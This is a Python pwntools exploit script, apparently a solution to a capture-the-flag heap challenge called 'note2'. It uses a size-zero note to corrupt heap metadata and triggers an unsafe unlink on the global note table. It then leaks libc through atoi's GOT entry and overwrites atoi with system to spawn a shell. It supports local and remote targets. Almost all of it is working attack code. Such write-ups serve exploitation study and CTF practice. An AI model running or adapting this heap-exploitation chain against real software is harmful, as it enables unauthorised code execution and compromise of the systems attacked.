from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else 'note2'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'option--->>\n', str(idx).encode())

def create(sz, content):
    opt(1)
    sla(b'128)\n', str(sz).encode())
    if (sz > 1 + len(content)):
        sla(b'content:\n', content)
    else:
        sa(b'content:\n', content)

def edit(idx, content):
    opt(3)
    sla(b'the note:\n', str(idx).encode())
    sla(b'2.append]\n', b'1')
    if (0x90 > 1 + len(content)):
        sla(b'Contents:', content)
    else:
        sa(b'Contents:', content)

def show(idx):
    opt(2)
    sla(b'the note:\n', str(idx).encode())

def delete(idx):
    opt(4)
    sla(b'the note:\n', str(idx).encode())

def exp():
    sla(b'name:\n', b'keke\n')
    sla(b'address:\n', b'1234\n')

    addr_global_tbl = 0x602120
    fake_chunk_ptr = addr_global_tbl
    fake_fd = fake_chunk_ptr - 0x18
    fake_bk = fake_chunk_ptr - 0x10
    payload_unlink = flat({
        0x8:    0xa1,
        0x10:   fake_fd,
        0x18:   fake_bk,
    })
    create(0x80, payload_unlink)    # chunk0
    create(0, b'\n')                # chunk1
    create(0x80, b'2\n')            # chnunk2
    
    delete(1)
    payload_overwrite_chunk2_prev_size = flat([0, 0, 0xa0, 0x90]) + b'\n'
    create(0, payload_overwrite_chunk2_prev_size)

    delete(2)   # trigger unlink
    # now ptr[0] == ptr-0x18
    payload_make_note0_point_to_note1 = flat({0x18:addr_global_tbl + 8})
    edit(0, payload_make_note0_point_to_note1)

    payload_modify_note1_points_to_got = flat(exe.got.atoi)
    edit(0, payload_modify_note1_points_to_got)

    # leak address of atoi to calculate libc base
    show(1)
    ru(b'Content is ')
    libc.address = u64(r(6).ljust(8, b'\0')) - libc.sym.atoi
    log.success('libc: %#x' % libc.address)

    # modify atoi@got = system
    edit(1, p64(libc.sym.system))

    opt('/bin/sh')

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()